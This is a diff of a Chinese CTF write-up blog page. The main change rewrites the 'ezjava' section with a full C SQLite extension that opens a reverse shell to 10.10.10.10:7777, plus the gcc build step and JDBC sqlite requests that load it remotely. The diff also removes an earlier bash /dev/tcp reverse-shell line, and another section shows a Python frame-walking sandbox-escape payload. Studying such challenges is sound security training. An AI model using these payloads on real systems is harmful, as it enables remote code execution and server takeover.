@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/favicon.ico">
 <meta property="article:published_time" content="2024-05-20T05:30:13.000Z">
-<meta property="article:modified_time" content="2024-05-21T04:54:13.629Z">
+<meta property="article:modified_time" content="2024-05-21T12:43:11.062Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -178,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~36.98K
+                        ~37.99K
                     
                     字
                 </li>
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1716267253629"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1716295391062"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -444,7 +444,7 @@
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;def func():\n    def f():\n        yield g.gi_frame.f_back\n    g = f()\n    frame = [x for x in g][0]\n    builtin = frame.f_back.f_back.f_back.f_locals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]\n    code = frame.f_back.f_back.f_back.f_code\n    str = builtin.str\n    print(code.co_consts[16:17][0][32:])\nfunc()&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 <h2><span id="ezjava"> ezjava</span></h2>
 <p>哈哈，没想到是jdbc打sqlite，失策了。死磕mysql的后果是目光呆滞</p>
-<p>后续学习jdbc attack的时候再把这几个数据库的打法整理以下</p>
+<p>后续学习jdbc attack的时候再把这几个数据库的打法整理一下</p>
 <p>jadx反编译jar得到几个点：</p>
 <ul>
 <li>lib里基本上没有能打的链，log4j也是2.13版，甚至把jackson删了（至少打不了是真的</li>
@@ -488,15 +488,18 @@
 <img src="/posts/26055/31.png" class title="awa">
 <h3><span id="payload怎么写的"> payload怎么写的</span></h3>
 <p><a target="_blank" rel="noopener" href="https://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/">Jdbc碎碎念三：内存数据库 | m0d9’s blog</a></p>
-<p>参考它可以先写一个恶意的so，<strong>类似</strong>下面这个形式<span class="blur">脑测太麻烦了，到时候更新正式wp的时候再改</span></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    system(&#x27;bash -c &quot;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>参考它可以先写一个恶意的so</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Add your header comment here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span> <span class="comment">/* Do not use &lt;sqlite3.h&gt;! */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert your extension code here */</span></span><br><span class="line"><span class="type">int</span> tcp_port = <span class="number">7777</span>;</span><br><span class="line"><span class="type">char</span> *ip = <span class="string">&quot;10.10.10.10&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sqlite3_extension_init</span><span class="params">(</span></span><br><span class="line"><span class="params">  sqlite3 *db, </span></span><br><span class="line"><span class="params">  <span class="type">char</span> **pzErrMsg, </span></span><br><span class="line"><span class="params">  <span class="type">const</span> sqlite3_api_routines *pApi</span></span><br><span class="line"><span class="params">)</span>&#123;</span><br><span class="line">  <span class="type">int</span> rc = SQLITE_OK;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(tcp_port);</span><br><span class="line">    addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">    fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( connect(fd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dup2(fd, <span class="number">0</span>);</span><br><span class="line">    dup2(fd, <span class="number">1</span>);</span><br><span class="line">    dup2(fd, <span class="number">2</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先安装sqlite环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libsqlite3-dev</span><br></pre></td></tr></table></figure>
 <p>gcc编译成so：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>
-<p>写完so以后打一次请求(为什么用的是security，这个直接用的是现成的)：</p>
+<p>写完so以后打一次请求：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:3, &quot;url&quot;:&quot;jdbc:sqlite::resource:http://ip:port/exp.so&quot;&#125;</span><br></pre></td></tr></table></figure>
 <p>本地跑一下这个<code>jdbc:sqlite::resource:http://ip:port/exp.so</code>计算出hashCode，记住他重命名为了<code>sqlite-jdbc-tmp-xxx.db</code></p>
 <p>su18师傅有现成的poc.db，下下来用就行了，表名就是security，把里面的内容改一改。这里可以用navicat改，也貌似可以用010Editor改</p>
-<p>第二次请求打poc.db：</p>
+<img src="/posts/26055/32.png" class title="awa">
+<p>第二次请求打poc.db，记得添加tableName：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:3, &quot;url&quot;:&quot;jdbc:sqlite::resource:http://ip:port/poc.db&quot;, &quot;tableName&quot;:&quot;security&quot;&#125;</span><br></pre></td></tr></table></figure>
 <p>监听反弹的port，等shell弹过来即可，比如我这里通过debug测得文件名为：<code>sqlite-jdbc-tmp--741179700.db</code></p>
 <p>此时请求如下：</p>
@@ -600,7 +603,7 @@
                     <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-05-21T04:54:13.629Z" itemprop="dateModified">最后编辑：2024-05-21</time>
+                    <time datetime="2024-05-21T12:43:11.062Z" itemprop="dateModified">最后编辑：2024-05-21</time>
                 </div>
             </div>
         </footer>
